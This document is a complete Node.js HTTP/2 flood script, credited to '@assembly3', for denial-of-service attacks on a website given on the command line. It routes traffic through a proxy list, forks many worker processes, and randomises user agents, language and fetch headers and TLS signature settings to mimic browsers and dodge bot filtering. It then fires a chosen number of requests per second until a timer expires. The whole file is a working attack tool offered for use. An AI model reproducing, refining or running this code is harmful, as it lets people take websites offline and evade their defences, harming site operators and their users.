const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
 });

if (process.argv.length < 7){console.log(`writen by @assembly3: node tls-c.js target time rate thread proxyfile`); process.exit();}
const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
   }
} else {setInterval(runFlooder) }

class NetSocket {
    constructor(){}

HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 60000);

    connection.on("connect", () => {
        connection.write(buffer);
    });

    connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "error: invalid response from proxy server");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "error: " + error);
    });
}
}

const fetch_site = [
  "same-origin",
  "same-site",
  "cross-site"
];

const fetch_mode = [
  "navigate",
  "same-origin",
  "no-cors",
  "cors"
];

const fetch_dest = [
  "document",
  "sharedworker",
  "worker"
];

const languages = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.8",
  "es-ES,es;q=0.9",
  "fr-FR,fr;q=0.9,en;q=0.8",
  "de-DE,de;q=0.9,en;q=0.8",
  "zh-CN,zh;q=0.9,en;q=0.8",
  "ja-JP,ja;q=0.9,en;q=0.8"
];
   
const useragents = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:135.0) Gecko/20100101 Firefox/135.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:134.0) Gecko/20100101 Firefox/134.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:133.0) Gecko/20100101 Firefox/133.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:132.0) Gecko/20100101 Firefox/132.0"
];

const ecdhCurve ="GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const sigalgs = [
 "ecdsa_secp256r1_sha256",
 "rsa_pss_rsae_sha256",
 "rsa_pkcs1_sha256",
 "ecdsa_secp384r1_sha384",
 "rsa_pss_rsae_sha384",
 "rsa_pkcs1_sha384",
 "rsa_pss_rsae_sha512",
 "rsa_pkcs1_sha512"
];

let SignalsList = sigalgs.join(':')

const Header = new NetSocket();

headers[":method"] = "GET";
headers[":scheme"] = "https";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path || "/";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
headers["accept-encoding"] = "gzip, deflate, br, zstd";
headers["upgrade-insecure-requests"] = "1";
headers["te"] = "trailers";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const randomUA = useragents[Math.floor(Math.random() * useragents.length)];
    
    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = randomUA;
    headers["accept-language"] = languages[Math.floor(Math.random() * languages.length)];
    headers["sec-fetch-site"] = fetch_site[Math.floor(Math.random() * fetch_site.length)];
    headers["sec-fetch-dest"] = fetch_dest[Math.floor(Math.random() * fetch_dest.length)];
    headers["sec-fetch-mode"] = fetch_mode[Math.floor(Math.random() * fetch_mode.length)];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
           ALPNProtocols: ['h2', 'http/1.1'],
           rejectUnauthorized: false,
           honorCipherOrder: false,
           sigalgs: SignalsList,
           socket: connection,
           ecdhCurve: ecdhCurve,
           port: 443,
           servername: parsedTarget.host,
       };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
           headerTableSize: 65536,
           maxHeaderListSize : 32768,
           initialWindowSize: 15564991,
           maxFrameSize : 16384,
           
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
           headerTableSize: 65536,
           maxHeaderListSize : 32768,
           initialWindowSize: 15564991,
           maxFrameSize : 16384,
         });

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   const request = client.request(headers, {
                     parent: 0,
                     exclusive: true,
                     weight: 220,
                   })
                   
                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return;
                   });

                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);